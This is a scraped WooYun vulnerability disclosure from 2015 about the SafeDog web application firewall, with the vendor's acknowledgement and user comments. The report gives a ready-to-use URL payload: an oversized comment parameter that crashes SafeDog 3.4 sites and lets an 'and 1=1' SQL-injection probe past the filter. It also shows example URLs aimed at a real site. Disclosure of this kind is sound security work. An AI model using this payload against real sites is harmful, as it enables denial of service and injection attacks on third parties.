{"id": 66329, "wybug_id": "wooyun-2015-0129611", "wybug_title": "安全狗拒绝服务/注入绕过(可导致大量网站拒绝服务)", "wybug_corp": "安全狗", "wybug_author": "路人甲", "wybug_date": "2015-07-27 10:15", "wybug_open_date": "2015-10-26 16:16", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["拒绝服务", "远程拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-31：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向公众公开  简要描述： 恨他就让他装个安全狗吧。 详细说明：  1.拒绝服务安全狗的某个版本在处理参数的时候处理不当，导致网站503拒绝服务。另外，该版本应该很常见吧，一共打了15个有狗的站，只有3个打不掉在url中加入如下参数即可：\na=/*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/&\n然后。。。该站就直接503了虽然安全狗已经推出了最新版，并防止了该程序的崩溃这是在\n\n\n\n但是。。。这服务器上的升级程序是怎么回事？\n\n最好强制升级！2.注入绕过(对于升级后的安全狗)本地刚刚下载了个安全狗，肯定是最新的，同样是上面的payload，421个以上的a，最新版的可以bypass掉对‘and’的过滤，但至少421个6，少了就被拦截。虽然只可以绕过\"and\"关键字，但是已经可以测试该网址是否存在注入了，详情见证明中的视频，如果还握有其他bypass，还也可以进一步利用。被拦截：\nhttp://bbs.sdcms.cn/company_/post.aspx?threadid=14669&action=reply&page=1%20and%201=1 and 1=1\n放过：\nhttp://bbs.sdcms.cn/company_/post.aspx?a=/*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/&threadid=14669&action=reply&page=1%20and%201=1 and 1=1\n所以一共是两种情况，要么被挂掉，要么被绕过。   漏洞证明：  http://dns.aizhan.com/125.76.231.7/这是个安装了该版本的安全狗的服务器，几乎所有网站都可以被挂掉，其他例子太多了，已经D成功的还有韵达美国官网，艾慕网等视频地址：http://www.tudou.com/programs/view/SVUiRKopaTs/密码1234第二个视频被土豆屏蔽了，只能放百度云。地址：http://pan.baidu.com/s/1o6JyH42密码：yn9q\n\n\n\n   修复方案：  重新过滤，强制升级   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-07-28 16:14 厂商回复： 感谢提交，周一就看到了，到今天才确认是因为这边需要测试，然后也是让研发赶快发个“从3.4升级到3.5”的“补！丁！包！”给3.4版本的用户。需要说明的是，该漏洞只影响3.4版本，最新的3.5版本是不受影响的，请广大站长放心。考虑到还有好多用户在用3.4版本的安全狗，所以这次的影响认定为“高”。最后，欢迎白帽子对最新的3.5版进行测试，我们将公正的进行裁定，对安全狗做出重大贡献的白帽子，我们是不会忘记你们的。最后的最后，本次的补丁将自（强）动（行）下（升）发（级），将版本提至3.5，请广大站长放心！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-27 10:21 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  so屌！！    \n     2015-07-27 10:25 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  恨他就让他装个安全狗吧    \n     2015-07-27 10:32 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  恨他就让他装个安全狗吧    \n     2015-07-27 10:58 |    \t\tzhiher \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  恨他就让他装个安全狗吧    \n     2015-07-27 11:04 |    \t\tlevin \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | print(\"hello world!\"))\t\t \n  mark!!!    \n     2015-07-27 11:26 |    \t\t1c3z \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:45        | #)\t\t \n  果然是下面牛！！    \n     2015-07-27 11:26 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1707 漏洞数:273        | ...........................................)\t\t \n  为啥匿名？    \n     2015-07-27 11:54 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  反噬神技！    \n     2015-07-27 12:13 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:78        | The quiter you are,the more you're able ...)\t\t \n  @range    \n     2015-07-27 12:13 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  求个shell    \n     2015-07-27 12:19 |    \t\trange \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:32        | 这个人有点懒，没有写个人简介)\t\t \n  @Me_Fortune 略屌    \n     2015-07-27 12:21 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:100        | 很早前，我就有个梦想。哪一天能站在国家会...)\t\t \n  啥都不说了，下午买包烟带上来！    \n     2015-07-27 12:23 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  下面牛就是牛。    \n     2015-07-27 12:24 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:100        | 很早前，我就有个梦想。哪一天能站在国家会...)\t\t \n  /呲牙 坐等安全狗    \n     2015-07-27 12:41 |    \t\tzhc矜持 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | ashq)\t\t \n  mark!!!    \n     2015-07-27 12:59 |    \t\tIOT \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 不知道什么时候才有很多人知道我呢)\t\t \n  终于出来杀狗的了！叫你装狗！！！    \n     2015-07-27 13:31 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:9        | 我是来打酱油的。)\t\t \n  牛逼    \n     2015-07-27 13:45 |    \t\t夸父追日 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:6        | 喝最烈的酒,日最疯的狗)\t\t \n  吓的我赶紧把狗卸载掉了,卧槽 吓死我了    \n     2015-07-27 14:39 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:45        )\t\t \n  恨他就让他装个安全狗吧     \n     2015-07-27 14:59 |    \t\tzhiher \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  @xsser 求审核http://www.wooyun.org/bugs/wooyun-2015-0129426/trace/696b089fc73877870e8fdc8f8034ca61    \n     2015-07-27 15:03 |    \t\t小将 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | --)\t\t \n  你是怎么做到的亲！    \n     2015-07-27 15:07 |    \t\trange \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:32        | 这个人有点懒，没有写个人简介)\t\t \n  坐等5rank    \n     2015-07-27 16:04 |    \t\tFormat_smile \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:74        | ···孰能无过，谁是谁非！渗透穷三代，黑...)\t\t \n  杀狗牛    \n     2015-07-27 16:08 |    \t\tMowen \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 没个性，不签名！)\t\t \n  求shell    \n     2015-07-27 20:11 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  貌似之前看到过？    \n     2015-07-27 20:57 |    \t\tSoulmk \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 过来学习~~)\t\t \n  坐等公布    \n     2015-07-27 23:52 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:16        | TXTSEC信息安全团队)\t\t \n  爱他就让他装个安全狗吧。    \n     2015-07-29 09:58 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:100        | 很早前，我就有个梦想。哪一天能站在国家会...)\t\t \n  请客吃饭！！！    \n     2015-07-29 10:02 |    \t\tJGHOOluwa \t\t\t( 普通白帽子  |\t\t\t        Rank:301 漏洞数:50        | 就是来看看大牛们如何超神的^-^)\t\t \n  汪汪汪    \n     2015-07-29 12:50 |    \t\tTren \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:42        | 求带求装B)\t\t \n  终于有杀狗的了！！！    \n     2015-07-29 13:38 |    \t\tb34r \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 4 b34r)\t\t \n  围观大牛，哈哈    \n     2015-07-29 13:39 |    \t\t乌云合作伙伴-绿盟(乌云厂商)\t\t \n  @range    \n     2015-07-29 13:40 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:100        | 很早前，我就有个梦想。哪一天能站在国家会...)\t\t \n  @乌云合作伙伴-绿盟 我去，你怎么知道。    \n     2015-07-29 13:55 |    \t\t安全狗(乌云厂商)\t\t \n  @乌云合作伙伴-绿盟 我都不知道是谁，这你都知道？    \n     2015-07-29 18:07 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:78        | The quiter you are,the more you're able ...)\t\t \n  @乌云合作伙伴-绿盟 这货到处装逼啊。。哈哈    \n     2015-07-31 16:26 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:31        | 新手上路。)\t\t \n  这个不会忘记你们的……听起来慎得慌    \n     2015-07-31 16:28 |    \t\t安全狗(乌云厂商)\t\t \n  @幻老头儿 放心，我们不咬人！    \n     2015-07-31 16:33 |    \t\tsOnsec \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:27        | 安全是什么...)\t\t \n  ....    \n     2015-07-31 19:21 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  要紧    \n     2015-08-01 11:29 |    \t\t背影 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:3        )\t\t \n  1000到手~    \n     2015-08-01 13:23 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:78        | The quiter you are,the more you're able ...)\t\t \n  @背影 一万    \n     2015-08-01 14:37 |    \t\tqdq \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 有关部门)\t\t \n  某主机卫士是不是更靠谱一些    \n     2015-08-01 19:24 |    \t\t半块西瓜皮 \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:6        | 无)\t\t \n  就是叼    \n     2015-08-02 00:39 |    \t\trange \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:32        | 这个人有点懒，没有写个人简介)\t\t \n  @半块西瓜皮 我擦，西瓜牛都出来了    \n     2015-08-02 13:00 |    \t\t冉阿让 \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:31        | Come from Greets.py)\t\t \n  对安全狗做出重大贡献的白帽子，我们是不会忘记你们的。    \n     2015-08-03 12:25 |    \t\tByL \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 早起的虫儿被鸟吃！)\t\t \n  对安全狗做出重大贡献的白帽子，我们是不会忘记你们的。    \n     2015-08-04 12:12 |    \t\tifk \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:5        | 无)\t\t \n  @range 就为了评论你 我都注册乌云了！ 哈哈哈~  膜拜~~    \n     2015-08-04 17:01 |    \t\trange \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:32        | 这个人有点懒，没有写个人简介)\t\t \n  @ifk 66666    \n     2015-08-05 08:31 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:32        | 不会弹吉它的黑客不是好歌手)\t\t \n  对安全狗做出重大贡献的白帽子，我们是不会忘记你们的。    \n     2015-08-05 10:50 |    \t\thuoji \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 目标是当个农民)\t\t \n  对安全狗做出重大贡献的白帽子，我们是不会忘记你们的。    \n     2015-08-05 11:09 |    \t\t北风 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 24K纯屌丝，见框就xss小王子)\t\t \n  对安全狗做出重大贡献的白帽子，我们是不会忘记你们的。    \n     2015-10-26 17:06 |    \t\tAgeloVito \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | Just do what i love, enjoy it and try my...)\t\t \n  恨他就让他装个安全狗吧     \n     2015-10-26 20:41 |    \t\t老实先生 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:8        | 只会注不会shell)\t\t \n  有技术含量    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}